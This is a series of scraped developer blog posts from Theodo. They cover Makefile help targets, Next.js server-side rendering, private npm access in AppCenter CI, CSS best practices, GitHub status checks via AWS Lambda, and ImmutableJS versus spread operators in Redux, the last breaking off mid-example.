After the project installation, a complexity for the developer is to find the commands needed to develop features locally.
We decided to create a Makefile to gather all the useful commands we use in the project on a daily basis.
What are the advantages of this:

The commands are committed and versioned
All developers of the team are using the same, reviewed commands. -> there is no risk to forget one thing before executing a command line and break something
It is language agnostic -> which means you can start php jobs, javascript builds, docker commands, …
It’s well integrated with the OS -> for instance there is autocompletion for targets and even for options
You can use it for continuous improvement -> when a command fails for one dev, modify that command and commit the new version. It will never fail anymore!

Auto-generate a help target
But after a long time, we started having a lot of commands.
It was painful to find the one you wanted in the file, and even to know the one that existed
So we added a new target help, in order to automatically generate a list of available commands from the comments in the Makefile.
The initial snippet we used is:

.DEFAULT_GOAL := help
help:
    @grep -E '(^[a-zA-Z_-]+:.*?##.*$$)|(^##)' $(MAKEFILE_LIST) | awk 'BEGIN {FS = "":.*?## ""}{printf ""\033[32m%-30s\033[0m %s\n"", $$1, $$2}' | sed -e 's/\[32m##/[33m/'

If you add the following target and comments in your Makefile:

## Example section
example_target: ## Description for example target
        @does something

It would give this help message:

This generic, reusable snippet has another advantage: the documentation it generates is always up to date!
And you can customize it to your need, for instance to display options associated to your commands.

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us

										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Martin Guillier
  			
  				  			
  		
    
			

									"
"
										Usually, we are completely running React.js on client-side: Javascript is interpreted by your browser. The initial html returned by the server contains a placeholder, e.g. <div id=""root""></div>, and then, once all your scripts are loaded, the entire UI is rendered in the browser. We call it client-side rendering.
The problem is that, in the meantime, your visitor sees… nothing, a blank page!
Looking for how to get rid of this crappy blank page for a personal project, I discovered Next.js: in my opinion the current best framework for making server-side rendering and production ready React applications.
Why SSR (Server-Side Rendering)?
This is not the point of this article, but here is a quick sum-up of what server-side rendering can bring to your application:

Improve your SEO
Speed up your first page load
Avoid blank page flicker before rendering

If you want to know more about it, please read this great article: Benefits of Server-Side Over Client Side Rendering.
But let’s focus on the “how” rather than the “why” here.
What’s the plan?
For this article, I start with a basic app made with create-react-app. Your own React application is probably using similar settings.
This article is split in 3 sections matching 3 server-side-rendering strategies:

How tomanually upgrade your React app to get SSR
How to start with Next.js from scratch
Migrate your existing React app to server-side with Next.js

I won’t go through all the steps, but I will bring your attention on the main points of interesting. I also provide a repository for each of the 3 strategies. As the article is a bit long, I’ve split it in 2 articles, this one will only deal with the first 2 sections. If your main concern is to migrate your app to Next.js, you can go directly to the second article (coming soon).
1) Look how twisted manual SSR is…

In this part, we will see how to implement Server-side Rendering manually on an existing React app. Let’s take the create-react-app starter code:

package.json for dependencies
Webpack configuration included
App.js – loads React and renders the Hello component
index.js – puts all together into a root component

Checking rendering type
I just added to the code base a simple function isClientOrServer based on the availability of the Javascript object window representing the browser’s window:
const isClientOrServer = () => {
  return (typeof window !== 'undefined' && window.document) ? 'client' : 'server';
};

so that we display on the page what is rendering the application: server or client.
Test it by yourself

clone this repository
checkout the initial commit
install the dependencies with yarn
launch the dev server with yarn start
browse to http://localhost:3000 to view the app

I am now simulating a ‘3G network’ in Chrome so that we really understand what is going on:

Implementing Server-side Rendering
Let’s fix that crappy flickering with server-side rendering! I won’t show all the code (check the repo to see it in details) but here are the main steps.
We first need a node server using Express: yarn add express.
In our React app, Webpack only loads the src/ folder, we can thus create a new folder named server/ next to it. Inside, create a file index.js where we use express and a server renderer.
// use port 3001 because 3000 is used to serve our React app build
const PORT = 3001; const path = require('path');

// initialize the application and create the routes
const app = express();
const router = express.Router();

// root (/) should always serve our server rendered page
router.use('^/$', serverRenderer);

To render our html, we use a server renderer that is replacing the root component with the built html:
// index.html file created by create-react-app build tool
const filePath = path.resolve(__dirname, '..', '..', 'build', 'index.html');

fs.readFile(filePath, 'utf8', (err, htmlData) => {
  // render the app as a string
  const html = ReactDOMServer.renderToString(<App />);

  // inject the rendered app into our html
  return res.send(
    htmlData.replace(
      '<div id=""root""></div>',
      `<div id=""root"">${html}</div>`
    )
  );
}

This is possible thanks to ReactDOMServer.renderToString which fully renders the HTML markup of a page to a string.
We finally need an entry point that will tell Node how to interpret our React JSX code. We achieve this with Babel.
require('babel-register')({
  ignore: [ /(node_modules)/ ],
  presets: ['es2015', 'react-app']
});

Test it by yourself

checkout last changes on master branch
install the dependencies with yarn
build the application with yarn build
declare babel environment in your terminal: export BABEL_ENV=development
launch your node server with node server/bootstrap.js
browse to http://localhost:3001 to view the app

Still simulating the ‘3G network’ in Chrome, here is the result:

Do not be mistaken, the page is rendered by server. But as soon as the javascript is fully loaded, window.document is available and the isClientOrServer() function returns client.
We proved that we can do Server-side Rendering, but what’s going on with that React logo?!
We’re missing many features
Our example is a good proof of concept but very limited. We would like to see more features like:

import images in js files (logo problem)
several routes usage or route management (check this article)
deal with the </head> and the metatags (for SEO improvements)
code splitting (here is an article solving the problem)
manage the state of our app or use Redux (check this great article

and performance is bad on large pages: ReactDOMServer.renderToString() is a synchronous CPU bound call and can starve out incoming requests to the server. Walmart worked on an optimization for their e-commerce website.
It is possible to make Server-side Rendering work perfectly on top of create-react-app, we won’t go through all the painful work in this article. Still, if you’re interested in it, I attached just above some great articles giving detailed explanations.
Seriously… Next.js can bring you all these features!
2) Next.js helps you building server rendered React.js Application

What is Next.js?
Next.js is a minimalistic framework for server-rendered React applications with:

a very simple page based routing
Webpack hot reloading
automatic transpilation (with babel)
deployment facilities
automatic code splitting (loads page faster)
built in css support
ability to run server-side actions
simple integration with Redux using next-redux-wrapper.

Get started in 1 minute
In this short example, we are going to see how crazy simple it is to have a server-side rendering app ready with Next.js.
First, generate your package.json with npm init and install Next.js with npm install --save next react react-dom. Then, add a script to your package.json like this:
""scripts"": {
  ""dev"": ""next"",
  ""build"": ""next build"",
  ""start"": ""next start""
}

Create a pages/ folder. Every .js file becomes a route that gets automatically processed and rendered. Add a index.js file in that pages/ folder (with the execution of our isClientOrServer function):
const Index = ({ title = 'Hello from Next.js' }) => (
  <div>
    <h1>{title}</h1>
    <p className=""App-intro"">
      Is my application rendered by server or client?
    </p>
    <h2><code>{isClientOrServer()}</code></h2>
  </div>
);

export default Index;

No need to import any library at the top of our index.js file, Next.js already knows that we are using React.
Now enter npm run dev into your terminal and go to http://localhost:3000: Tadaaaaa!

Repeat the same operation inside your pages/ folder to create a new page. The url to access it will directly match the name you give to the file.
You’re ready to go! You’re already doing SSR. Check the documentation on Next.js official repository.
Use create-next-app
You want to start a server-side rendered React app, you can now stop using create-react-app, and start using create-next-app:
npm install -g create-next-app

create-next-app my-app
cd my-app/
npm run dev

This is all you need to do to create a React app with server-side rendering thanks to Next.js.
Finally, better than a simple Hello World app, check this Hacker News clone implementing Next.js. It is fully server-rendered, queries the data over Firebase and updates in realtime as new votes come in.
Vue.js and Nuxt
You’re maybe a Vue.js developer. Just after Next.js first release, two french brothers made the same for Vue.js: Nuxt was born! Like Vue, the Nuxt documentation is very clear and you can use the same starter template vue-cli for you app:
 vue init nuxt-community/starter-template <project-name> 
What’s Next? 
Hope you liked this article which was mainly written in order to introduce server-side rendering with Next.
If you are interested in server-side rendering for your existing React application, in the following, I am going to demonstrate how to migrate your existing create-react-app to Next.js. Coming soon…

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us

										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Baptiste Jan
  			
  				Web Developer @Theodo. I like Vue.js and all the ecosystem growing around.  			
  		
    
			

									"
"
										AppCenter is a great CI platform for Mobile Apps. At Theodo we use it as the standard tool for our react-native projects.
In a recent project, we needed to have a shared NPM package between the React and React-Native applications. There is no mention of how to achieve this in the AppCenter documentation, and if you ask their support they will say it’s not possible.
Me: Hello, we’re wanting to have a shared library used in our project. This would require an npm install from a private NPM repo (through package cloud). What is the best practice for adding a private npm access on the AppCenter CI?
Microsoft: We currently only support cloud git repositories hosted on VSTS, Bitbucket and GitHub. Support for private repos is not available yet but we are building new features all the time, you can keep an eye out on our roadmap for upcoming features.
Luckily there is a way!

AppCenter provides the ability to add an `appcenter-post-clone.sh` script to run after the project is cloned. To add one, just add a file named `appcenter-post-clone.sh`, push your branch and, on the configure build screen, see it listed.

Pro Tip: You need to press “Save and Build” on the build configuration after pushing a new post-clone script on an existing branch.
Now, what to put in the script?
Having a .npmrc in the directory you run ‘npm install’ or ‘yarn install’ from allows you to pass authentication tokens for new registries.
We want a .npmrc like this:

always-auth=true
registry=https://YOUR_PACKAGE/NAME/:_authToken=XXXXXXXX

Obviously, we don’t really want to commit our read token to our source code, therefore we should use an environment variable.
So we can add to our post-clone script:

touch .npmrc
echo ""always-auth=true
registry=https://YOUR_PACKAGE/NAME/:_authToken=${READ_TOKEN}"" > .npmrc

Now, on AppCenter, we can go into the build configuration and add an environment variable called ‘READ_TOKEN’.

Now rebuild your branch and your package installs should pass.

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us

										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Ben Ellerby
  			
  				I'm an Architect Developer, working with startups to launch MVP's and large corporates to deliver in startup speed. 

I'm tech at heart, loving to code, participating in hackathons, guest lecturing as part of the University of Southampton CompSci course and acting as a tech advisor to multiple startups.

https://www.linkedin.com/in/benjaminellerby/  			
  		
    
			

									"
"
										Through my experiences, I encountered many fellow coworkers that found CSS code painful to write, edit and maintain. For some people, writing CSS is a chore. One of the reasons for that may be that they have never been properly taught how to write good CSS in the first place, nor what is good CSS. Thus it has an impact on their efficiency and on the code quality, which isn’t what we want. This two parts article will focus on:

Part 1: What is good CSS code? (more precisely, what is not good CSS). I will focus on actionable tips and tricks to avoid creating technical debt starting now.
Part 2: how to migrate from a complex legacy stylesheet to a clean one.

Warning: these are the guidelines that I gathered through my experiences and that worked well for many projects I worked on. In the end, adopt the methods that fit your needs.
Requirements
I assume that you are looking for advice to improve yourself at writing CSS, thus you have a basic knowledge of CSS and how it works. In addition, you will need these things:
A definition of done
You should be very clear about which browser/devices you want to support or not. You must list browsers/devices you want to support and stick to it. Here is an example of what can be a definition of done:

Browsers: Chrome ≥ 63, Firefox ≥ 57, Edge ≥ 12
Devices: laptops with resolution ≥ 1366*768

You must write this list with a business vision: maybe your business needs IE support because 20% of your users are using it. You can be specific for some features. For instance: the landing page should work on devices with small screens but the app behind the login should not.
But if your Definition Of Done does not include IE9, do not spend unnecessary time fixing exotic IE9 bugs. From there you can use caniuse.com to see which CSS features are supported on your target browsers (example below).

A good understanding of what specificity is
Here is a quick reminder about what is specificity:
Specificity determines which CSS rule is applied by the browsers. If two selectors apply to the same element, the one with higher specificity wins.
The rules to win the specificity wars are:

Inline style beats ID selectors. ID selectors are more specific than classes and attributes (::hover, ::before…). Classes win over element selectors.
A more specific selector beats any number of less specific selectors. For instance, .list is more specific than div ul li.
Increasing the number of selectors will result in higher specificity. .list.link is more specific than .list and .link.
If two selectors have the same specificity, the last rule read by the browser wins.
Although !important has nothing to do with the specificity of a selector, it is good to know that a declaration using !important overrides any normal declaration. When two conflicting declarations have the !important keyword, the declaration with a greater specificity wins.

Here is a good website to compute the specificity of a selector: Specificity Calculator. Below is a chart to recap all these rules (taken from this funny post on specificity).

Some basic knowledge of preprocessors
Preprocessors are great because they allow you to write CSS faster. They also help to make the code more understandable and customizable by using variables. Here I will use a SCSS syntax in the examples (my favorite preprocessor but others like LESS/Stylus are pretty similar). An example of what you can do with preprocessors:
// vars.scss
$messageColor: #333;

// message.scss
@import 'vars';
%message-shared {
    border: 1px solid black;
    padding: 10px;
    color: $messageColor;
}

.message {
    @extend %message-shared;
}
.success {
    @extend %message-shared;
    border-color: green;
}

Variables in CSS can now be done with native CSS but preprocessors still have the upper hand on readability/usability.
What you should not do
I will show you what you DON’T want to do and explain why such coding practices will lead to many problems over time.
Don’t write undocumented CSS
I put this point first because I believe it’s one of the most impactful things you can act on straightaway. Like any other language, CSS needs to be commented. Most stylesheets don’t have comments. And when I advise you to write comments, I don’t talk about this:
// Header style
.header {}

Those are bad comments because they have no purpose and convey no additional information. A good CSS comment explains the intention behind a selector/rule. Here is an example of some good comments:
.suggestions {
    // 1 should be enough but in fact there is a Bootstrap rule that says
    // .btn-group>.btn:hover z-index: 2 (don't ask me why they did this)
    z-index: 3;
}

// Firefox doesn't respect some CSS3 specs on the box model rules
// regarding height. This is the only cross-brower way to do an 
// overflowing-y child in a fixed height container.
// See https://blogs.msdn.microsoft.com/kurlak/2015/02/20/filling-the-remaining-height-of-a-container-while-handling-overflow-in-css-ie8-firefox-chrome-safari/
.fixed-height-container {}

What should you comment on?

CSS hacks
Every line you didn’t write or you wrote 6 months ago (which is the same) where you needed more than 10 seconds to understand its intended purpose.
Magic values. Speaking of which…

Don’t use magic values
The most common thing between developers resenting CSS is a general feeling of black magic. Put a rule here and an !important there, with a width value that looks good and it works. You see? Magic. But magic doesn’t exist. You should have a more scientific approach to demystify CSS. Writing good comments is one thing. Stopping writing magic values is another.
I define a magic value by “any value that looks weird, aka is not a multiple of 5” – even then some values may look weird. Examples of magic values are:
left: 157px;
height: 328px;
z-index: 1501;
font-size: 0.785895rem;

Why are these values problematic? Because again, they do not convey the intention. What is better:

Using preprocessor variables which adds a meaning to a number.
Make the exact calculation. If you wrote this value after some tests using the Chrome dev tools you may find out with a scientific approach that your initial “magic” value may not be the most accurate one.
Commenting the value to explain why it’s here.
Challenging your value/unit and changing it to a more pertinent one.

Example:
left: calc(50% - ($width / 2));
// An item have a 41px height:
// 2*10px from padding+20px from line-height+1px from one border.
// So to get 8 items in height:
height: 8 * 41px;
z-index: 1501; // Needs to be above .navbar
font-size: 0.75rem;

Don’t use px units everywhere
Most hellish CSS stylesheets use px units everywhere. In fact, you should almost never use them. In most cases, pixels never is the good unit to use. Why? Because they don’t scale with the font-size or the device resolution. Here is a recap of which unit to use depending on the context. Quick cheat sheet:

px: do not scale. Use for borders and the base font size on the html element. That’s all.
em, rem (> IE8): scale with the font-size. 1.5em is 150% of the font size of the current element. 0.75rem is 75% of the font size of the html element. Use rem for typography and everything vertical like margins and paddings. Use em wisely for elements relative to the font-size (icons as a font for instance) and use it for media query breakpoints.
%, vh, vw (> IE8): scale with the resolution. vh and vw are percentages of the viewport height and width. These units are perfect for layouts or in a calc to compute the remaining space available (min-height: calc(100vh - #{$appBarHeight})).

I made a page for you to play with the base font-size and CSS units (open in a new window to resize the viewport and try changing the zoom setting).
Don’t use !important
You should keep your specificity as low as possible. Otherwise, you will be overriding your override rules. If you tend to override your styles, with time passing you will hit the hard ceiling – !important and inline style. Then it will be a nightmare to create more specific CSS rules.
Using !important is a sign that you’re working against yourself. Instead, you should understand why you have to do this. Maybe refactoring the impacted class will help you, or decoupling the common CSS in another class would allow you not to use it and lower your specificity.
The only times you should use it is when there is absolutely no other way to be more specific than an external library you are using.
Don’t use IDs as selectors
Keep. Your. Specificity. Low. Using an ID instead of a class condemn you to not reuse the code you’re writing right now. Furthermore, if your javascript code is using IDs as hooks it could lead to dead code (you are not certain whether you can remove this ID because it could be used by the JS and/or CSS).
Instead of using IDs, try to look up common visual patterns you could factorize for future reuse. If you need to be specific, add a class on the lowest level of the DOM tree possible. At the very least, use a class with the name you would have given to your ID.
// Don't
#app-navbar {}

// Slighlty better
.app-navbar {}

// Better (pattern that you could reuse)
.horizontal-nav {}

Don’t use HTML elements as selectors
Again. Keep your specificity low. Using HTML tags as selectors goes against this because you will have to add higher-specificity selectors to overwrite them later on. For instance, styling the a element (especially the a element, with all its use cases and different states) will be an inconvenience when you use it in other contexts.
// Don't
<a>Link</a>
<a class=""button"">Call to action</a>
<nav class=""navbar""><a>Navbar link</a></nav>
a { ... }
.button { ... }
// Because you will have to create more specific selectors
a.button { ...overrides that have nothing to do with the button style... }
.navbar a { ...same... }

// Better
<a class=""link"">Link</a>
<a class=""button"">Call to action</a>
<nav class=""navbar""><a class=""navbar-link"">Navbar link</a></nav>
.link { ...style of a link, can be used anywhere... }
.button { ...style of a button, idem... }
.navbar-link { ...style of a navbar link, used only in navbars... }

However, there are some cases when you could use them, for instance when a user wrote something like a blog post that is output in pure HTML format (therefore preventing you from adding custom classes).
// Don't
ul { ... }

// Better
%textList { ... }
.list { @extends %textList; }
.user-article {
    ul { @extends %textList; }
}

Furthermore, HTML should be semantic and the only hooks for style should be the classes. Don’t be tempted to use an HTML tag because it has some style attached to it.
A side-note on the ideal specificity
You should aim for a specificity of only one class for your CSS selectors.
The best part in Cascading Style Sheets is “cascading”. The worst part in Cascading Style Sheets is “cascading” — The Internet
The whole thing about CSS is that you want to make your style the same everywhere (therefore it needs to be reusable) AND you want to make it different in some unique places (therefore it needs to be specific). All CSS structure issues are variations of this basic contradiction.
Opinion: The Cascading effect of CSS can be a great tool and it serves a purpose: to determine which CSS declaration is applied when there is a conflict. But it is not the best tool to solve this problem. What if instead, there were no conflicts on CSS declarations, ever? We wouldn’t need the Cascade effect and everything would be reusable. Even “super-specific” code can be written as a class that will be used only once. If you use selectors of only one class, you will never need to worry about specificity and overwriting styles between components.
“But that could lead to a lot of duplicated source code”, you could say. And you would be right if there were no CSS preprocessors. With preprocessors, defining mixins to reuse bits of CSS by composition is a great way to factor your code without using more specific selectors.
There is still a concern over performance because the output stylesheet is bigger. But for most stylesheets/projects, CSS performance is irrelevant over javascript concerns. Furthermore, the advantage of maintainability far outweighs the performance gains.
If we try to combine the last three Don’ts, this is how I would take this code:
<main id=""main_page"">
    <p><a>Some link</a></p>
    <footer>
        <a>Some other link</a>
    </footer>
</main>

a {
    cursor: pointer;
}

#main_page {
    a {
        color: blue;

        &:hover {
            color: black;
        }
    }
}

footer {
    border: 1px solid black;

    a {
        color: grey !important;
    }
}

And turn it into this:
<main>
    <p><a class=""link"">Some link</a></p>
    <footer class=""footer"">
        <a class=""footer-link"">Some other link</a>
    </footer>
</main>

.link {
    cursor: pointer;
    color: blue;

    &:hover {
        color: black;
    }
}

.footer {
    border: 1px solid black;

    &-link {
        // You can use a mixin here if there is a need to factor in
        // the common code with .link
        cursor: pointer;
        color: grey;
    }
}

What you can do right now
Do try to understand how CSS declarations really work
There are some declarations you really want to understand. Because if you don’t there will still be a feeling of “black magic” happening.

vertical-align: middle; margin: 0 auto; all the things!
What you should know (tip: if you think you would not be able to explain it clearly to someone else, click the links):

The box model (width, height, padding, margin, border, box-sizing, display: block/inline/inline-block).
Positioning and positioning contexts (position: static/relative/absolute/fixed, z-index).
Typography (font-size, font-weight, line-height, text-transform, text-align, word-break, text-overflow, vertical-align)
Selectors (*, >, +, ::before, ::after, :hover, :focus, :active, :first-child, :last-child, :not(), :nth-child())

Bonus ones to go further:

A complete guide to tables
Transitions
Shadows & filters
Floats (only if you have to. My advice would be: don’t use floats).

Do look at Flexbox and Grid
If your Definition of Done doesn’t include older browsers and you don’t use/know the flexbox and/or grid model, it will solve a lot of your layout problems. You may want to check these great tutorials:

A complete guide to Flexbox (Chrome ≥ 21, Firefox ≥ 28, IE ≥ 10, Safari ≥ 6.1)
A complete guide to Grid (Chrome ≥ 57, Firefox ≥ 52, IE ≥ 10, Safari ≥ 10.3), a short example of grid use

An example of a possible layout implementation possible with Grid and that is not a nightmare to implement:

Do look at BEM and CSS modules/styled components and apply it to new components
You should use CSS guidelines such as BEM. It will make your code more maintainable/reusable and prevent you from going down into the specificity hell. Here is a great article on BEM which I recommend.
Furthermore, if you have a component-based architecture (such as React, Vue or Angular), I recommend CSS modules or styled components to remove the naming hassle of BEM (here is an article on the whole topic).
Opinion: there is one main gotcha with these tools. You may believe that the auto-scoping feature of these tools acts as a pseudo-magic protection. However, beware that you should not bypass the above Don’ts. For instance, using HTML elements in CSS modules selectors destroys the purpose of auto-scoping because it will cascade to all children components. You should also keep a strict BEM-like approach (structuring your component styles into blocks, elements, and modifiers) while using these kinds of tools.
Do challenge and remove useless CSS
A lot can be done by using only seven CSS properties. Do challenge CSS that does not seems essential. Is this linear-gradient background color essential when nobody sees the gradient effect? Are those box-shadow declarations really useful?
You can also find unused CSS with Chrome’s CSS coverage. In the “More tools” drop-down, activate the “Coverage” tool, start recording and crawl your target pages. Here is an example showing that the .TextStat class is never used, as well as 70% of the whole stylesheet.

Do it yourself
A note on frameworks like Bootstrap and others: they are useful for small and quick projects when you don’t have time to dedicate to style. But for many medium-sized and a lot of large-sized projects, don’t use them.
Over time, you will need to overwrite them and it will eventually take more time than doing it yourself because it will produce a more complex and more specific code.
In addition, doing your style yourself makes you learn a lot. UI designer is a whole job so creating a UI from scratch is a real challenge. At first, try to reproduce the same look and feel than other websites you like (you can look at the code with the browser dev tools). My personal experience is that I started to love and learn CSS the moment I threw Bootstrap out the window for a personal project and started writing my own style.

I hope that with all the above best practices you will feel more comfortable writing CSS and that it will help you enhance your code quality. In Part 2 I will address the hassle of migrating a hellish complex stylesheet full of black magic to a clean, understandable and maintainable one. So don’t hesitate to share your CSS horror stories!

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us

										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Albéric Trancart
  			
  				Albéric Trancart is an agile web developer at Theodo. He loves sharing what he has learnt and exchanging with great people.  			
  		
    
			

									"
"
										""Can't you name all your pull requests in the right format?""

""...Oops I just merged into production""

Using AWS lambdas can be a cool and useful way to improve your workflow with GitHub.
Blocking merges when tests fail on your branch is common, but GitHub status checks can be pushed much further.
Combining GitHub’s API and Lambdas provides this opportunity.
Status Checks
Turns out we can use a Github Webhook Listener to POST to an AWS lambda after any specified events(pushes, commits, forks, pull requests etc).
In response, lambdas can in turn POST back to a Pull Request and create/update a status check.
Or they can just POST at specified times.
To test this out and get it up and running, we could impose two checks:

A required format for pull request titles
Specific times where merging to production is prohibited

For a full in-depth guide on setting all this up for your project see my github-lambda-status-checks repo.
Event Listener
First we set up a lambda which can react to a JSON of information about a pull request.
After deploying the lambda via serverless we are given an endpoint which, using GitHub webhooks, can automatically be hit on every pull request action(create, edit, …)
The webhook provides the lambda with a large amount of information about the PR.
An abridged version of some of the information sent to the lambda is shown below:
Abridged GitHub Status Post
Amongst this, we are given a statuses_url to which we can send a POST request back to the GitHub API to create/update a status.
For example, sending the following created the fake CI status in the title image:
Success GitHub Status
We can add any logic based on say, the pull request title, to send back a status result (‘success’, ‘failure’, ‘pending’).
Post GitHub Status
These will appear, as in the title image, depending on the state sent.
In github-lambda-status-checks you can add any logic to gitWebhookListener.js from line 78 to tweak your status responses.
After any status check(which are unique by their context) has run at least once in a repo, it can be chosen as a Required status check on any protected branches(settings -> branches).
This will prevent the PR being merged unless the status check has a success state (see title image).
Cron Job
Lambdas can also be setup to trigger at set times in the day.
Using the GitHub API the lambda can say, GET all the pull requests from a given repo merging into the production branch.
At 4pm it could then send a pending state to all of these pull requests. If this check is set as Required, it would then block accidental merging at inappropriate times.
You could then trigger another lambda at 8am to unblock all these PRs.
Gotcha
If you set this status to ‘Required’ then any new pull request can not be merged until it passes this check, which won’t be until 8am the next day…
To overcome this you can check the time in the pull request event listener so that any new pull request can pass/fail the time check as expected.
What we did
We wanted to move a long running project from merging to production twice a week, to continuously deploying with every ticket.
The lambdas in this article came about to address some concerns we had about this.
Title Checker
Our release notes (linked directly to pull request titles) needed to accurately reflect what was in production at a given time (as opposed to random commit titles).
Devs/stakeholders needed to be able to quickly associate a pull request title to a team, ticket number and user story:
(A-TEAM 123) AAC I love this product

This was implemented similar to gitWebhookListener.js with simple JS/regex.
Time Checker
Our team had become accustomed to merging a validated ticket to a master branch.
This master branch would then be merged/deployed into production twice a week.
The worry with continuous deployment (eliminating master) was that a ticket may accidentally be merged to production (after validation) too late in the day (when bugs can’t be monitored/fixed).
Thus the timed lambda in githubTimeStatus.js (and the gotcha in githubWebhookListener.js) was implemented.
Further Applications
As we have seen, the response from GitHub provides a lot of information about the PR, so you could adapt this to any need you may have.
References
For a full in-depth guide on setting this up for your project see mygithub-lambda-status-checks repo.
Links

GitHub webhook listner Source
Support for ES6/ES7 Javascript
Serverless
GitHub API for statuses


										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us

										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Rob Cronin
  			
  				Developer at Theodo  			
  		
    
			

									"
"
										What is this article about?
When I first learned about ImmutableJS I was convinced it was a great addition to any project.
So I tried to make it a working standard at Theodo.
As we offer scrum web development teams for various projects going from POC for startups to years lasting ones for banks, we bootstrap applications all the time and we need to make a success of all of them!
So we put a strong emphasis on generalizing every finding and learning made on individual projects.
With this objective in mind we are determining which technical stack would be the best for our new projects.
Each developer contributes to this effort by improving the company’s technical stack whenever they makes a new learning.
When React was chosen as our component library we were just embarking on a hard journey that you may have experienced: making the dozens other decisions that come with a React app.
React then what?
One of those choices lead us to choose redux as our global state management lib.
We noticed that people were having troubles with Immutability in reducers, one of the three core principles of Redux
The first possibility to answer this purpose is defensive copying with ES6 spread operator { ...object }.
The second option we studied is Facebook’s ImmutableJS library.

Using ImmutableJS in your react-redux app means that you will no longer use JS data structures (objects, arrays) but immutable data structures (i.e. Map, List, …) and their methods like .set(), .get(). Using .set() on a Map, the Immutable equivalent of objects, returns a new Map with said modifications and does not alter previous Map.
In order to make an informed choice I observed the practices on projects that used either one of the two, gathered their issues and tried to find solutions for them.
This article is the result of this study and hopefully it will help you choose between those two!
In this first part I will compare those two options in the light of 3 criteria out of the 5 I studied: readability, maintainability and learning curve.
The second part of this study, coming soon, will explore performance and synergy with typing tools.
First Criterion, Readability: Immutable Wins!
If your state is nested and you use spread operators to achieve immutability, it can quickly become unreadable:
function reducer(state = defaultState, action) {
  switch (action.type) {
    case 'SET_HEROES_TO_GROUP':
      return {
        ...state,
        guilds: {
          ...state.guilds,
          [action.payload.guildId]: {
            ...state.guilds[action.payload.guildId],
            groups: {
              ...state.guilds[action.payload.guildId].groups,
              [action.payload.groupId]: {
                ...state.guilds[action.payload.guildId].groups[action.payload.groupId],
                action.payload.heroes,
              },
            },
          },
        },
      };
  }
}

If you ever come across such a reducer during a Code Review there is no doubt you will have troubles to make sure that no subpart of the state is mutated by mistake.
Whereas the same function can be written with ImmutableJS in a much simpler way
function reducer(state = defaultState, action) {
  switch (action.type) {
    case 'SET_HEROES_TO_GROUP':

      return state.mergeDeep(
        state,
        { guilds: { groups: { heroes: action.payload.heroes } } },
      ).toJS();
  }
}

Conclusion for Readability
ImmutableJS obviously wins this criteria by far if your state is nested.
One counter measure you can take is to normalize your state, for example with normalizr.
With normalizr, you never have to change your state on more than two levels of depth as shown on below reducer case.
// Defensive copying with spread operator
case COMMENT_ACTION_TYPES.ADD_COMMENT: {
  return {
    ...state,
    entities: { ...state.entities, ...action.payload.comment },
  };
}

// ImmutableJS
case COMMENT_ACTION_TYPES.ADD_COMMENT: {
  return state.set('entities', state.get('entities').merge(Immutable.fromJS(action.payload.comment)));
}

Second Criterion, Maintainability and Preventing Bugs: Immutable Wins Again!
A question I already started to answer earlier is: Why must our state be immutable?

Because redux is based on it
Because it will avoid bugs in your app

If for example your state is:
const state = {
  guilds: [
    // list of guilds with name and heroes
    { id: 1, name: 'Guild 1', heroes: [/*array of heroes objects*/]},
  ],
};

And your reducer case to change the name of a guild is:
switch (action.type) {
  case CHANGE_GUILD_NAME: {
    const guildIndex = state.guilds.findIndex(guild => guild.id === action.payload.guildId);

    const modifiedGuild = state.guilds[guildIndex];
    // here we do a bad thing: we modifi the old Guild 1 object without copying first, its the same reference
    modifiedGuild.name = action.payload.newName;

    // Here we do the right thing: we copy the array so that we do not mutate previous guilds
    const copiedAndModifiedGuilds = [...state.guilds];
    copiedAndModifiedGuilds[guildIndex] = modifiedGuild;

    return {
      ...state,
      guilds: copiedAndModifiedGuilds,
    };
  }
}

After doing this update, if you are on a detail page for Guild 1, the name will not update itself!
The reason for this is that in order to know when to re-render a component, React does a shallow comparison, i.e. oldGuild1Object === newGuild1Object but this only compares the reference of those two objects.
We saw that the references are the same hence no component update.
An ImmutableJS data structure always returns a new reference when you modify an object so you never have to worry about immutability.
Using spread operators and missing one level of copy will make you waste hours looking for it.
Another important issue is that having both javascript and Immutable objects is not easily maintainable and very bug-prone.
As you cannot avoid JS objects, you end up with a mess of toJS and fromJS conversions, which can lead to component rendering too often.
When you convert an Immutable object to JS with toJS, it creates a new reference even if the object itself has not changed, thus triggering component renders.
Conclusion for Maintainability
Immutable ensures you cannot have immutability related bugs, so you won’t have to check this when coding or during Code review.
One way to achieve the same without Immutable would be to replace the built-in immutability with immutability tests in your reducers.
it('should modify state immutably', () => {
  const state = reducer(mockConcatFeedContentState, action);

  // here we check that all before/after objects are not the same reference -> not.toBe()
  expect(state).not.toBe(mockConcatFeedContentState);
  expect(state.entities).not.toBe(mockConcatFeedContentState.entities);
  expect(state.entities['fakeId']).not.toBe(mockConcatFeedContentState.entities['fakeId']);
});

But making sure that your team-mates understand and always write such tests can be as painful as reading spread operators filled reducers.
My opinion is that Immutable is the best choice here on the condition that you use it as widely as possible in your app, thus limiting your use of toJS.
Third Criterion, Learning Curve: One point for Spread Operators
One important point when assessing the pros and cons of a library/stack is how easy will it be for new developers to learn it and to become autonomous on the project.
The results of my analysis on half a dozen projects using is that learning ImmutableJS is hard work.
You have a dozen data structures to choose from, about two dozen built-ins or methods that sometimes do not behave the same way javascript methods do.
Below are some examples of such differences:
const hero = {
  id: 1,
  name: 'Superman',
  abilities: ['Laser', 'Super strength'],
}

const immutableHero = Immutable.fromJS(hero); // converts objects and arrays to the ImmutableJS equivalent


// get a property value
hero.abilities[0] // 'Laser'
immutableHero.get('abilities', 0) // 'Laser'

// set a property value
hero.name = 'Not Superman'
immutableHero.set('name', 'Not Superman')

immutableHero.name = 'Not Superman' // nothing happens!

// Number of elements in an array / Immutable equivalent
hero.abilities.length // 2
hero.get('abilities').size // 2

// Working with indexes
const weaknessIndex = hero.abilities.indexOf('weakness') // -1
